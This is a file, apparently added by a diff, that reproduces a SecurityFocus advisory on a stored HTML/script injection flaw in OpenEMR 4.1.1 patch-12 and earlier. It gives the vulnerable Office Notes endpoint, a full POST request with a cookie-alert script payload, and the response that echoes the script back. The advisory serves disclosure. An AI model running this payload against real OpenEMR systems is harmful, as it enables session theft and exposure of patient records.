@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/61154/info
+
+OpenEMR is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+OpenEMR 4.1.1 patch-12 and prior are vulnerable. 
+
+1. Misc > Office Notes ('note' parameter is vulnerable with a POST to 
+/openemr-4.1.1/interface/main/onotes/office_comments_full.php)
+
+#Request:
+
+POST http://www.example.com/openemr-4.1.1/interface/main/onotes/office_comments_full.php HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/openemr-4.1.1/interface/main/onotes/office_comments_full.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+
+mode=new&offset=0&active=all&note=<script>alert(document.cookie)</script>
+
+#Response:
+
+<snip>
+<tr><td><input type=hidden value='' name='act115' id='act115'><input name='box115' id='box115' 
+onClick='javascript:document.update_activity.act115.value=this.checked' type=checkbox checked></td><td><label 
+for='box115' class='bold'>Wed February 06th</label> <label for='box115' class='bold'>(test)</label></td><td><label 
+for='box115' class='text'><script>alert(document.cookie)</script>&nbsp;</label></td></tr>
+<snip>
+
+
